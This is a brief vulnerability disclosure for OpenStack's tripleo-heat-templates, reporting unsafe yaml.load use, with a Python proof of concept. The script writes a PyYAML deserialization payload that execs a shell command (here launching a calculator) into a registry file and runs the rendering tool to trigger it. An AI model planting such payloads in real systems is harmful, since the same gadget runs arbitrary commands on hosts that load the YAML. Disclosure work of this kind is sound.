# Description
Heat templates for deploying OpenStack. Mirror of code maintained at opendev.org.
* **Vulnerability discription**
    untrusded loading of data by the yaml.load function leading to Arbitrary code execution.
# Proof of Concept

1. run exploit.py
```python
# exploit.py
import os
os.system('git clone https://github.com/openstack/tripleo-heat-templates.git')
os.chdir('tripleo-heat-templates/tools/')
exp = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('overcloud-resource-registry-puppet.yaml','w+').write(exp)
os.system('''python render-ansible-tasks.py --output ./ --ansible-tasks ./ --roles-list sdfsd''')
```
![](https://cdn.discordapp.com/attachments/789769803770494996/793058166161539092/Screenshot_from_2020-12-28_15-39-30.png)
